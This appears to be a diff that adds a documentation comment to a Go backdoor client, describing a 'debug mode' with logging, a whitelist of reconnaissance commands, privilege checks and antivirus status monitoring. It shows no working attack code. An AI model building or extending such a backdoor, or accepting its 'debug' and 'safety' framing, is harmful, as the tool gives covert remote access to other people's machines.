@@ -1,3 +1,46 @@
+/*
+Debug Mode Documentation
+
+This is a debug version of the backdoor client that provides enhanced logging and restricted functionality
+for testing and development purposes. The debug mode includes the following features:
+
+Key Features:
+- Verbose logging of all operations and connections
+- Restricted command set for safety
+- Clear error reporting and connection status
+- System information gathering capabilities
+- Built-in safety measures
+
+Debug Mode Restrictions:
+- Only allows execution of safe, pre-approved commands
+- Disabled file system manipulation commands
+- Disabled network manipulation commands
+- Disabled system modification commands
+
+Allowed Commands in Debug Mode:
+- sysinfo: Display system information
+- whoami: Show current user
+- hostname: Show system hostname
+- pwd: Show current directory
+- ls: List directory contents
+- ps: List running processes
+- netstat: Show network connections
+- ifconfig: Show network interfaces
+
+Security Features:
+- Constant monitoring of connection status
+- Authentication verification
+- System privilege level checking
+- Antivirus status monitoring
+
+Debug Output includes:
+- Connection attempts and status
+- Command reception and execution
+- System information gathering
+- Error messages and stack traces
+- Authentication process details
+*/
+
 package main
 
 import (
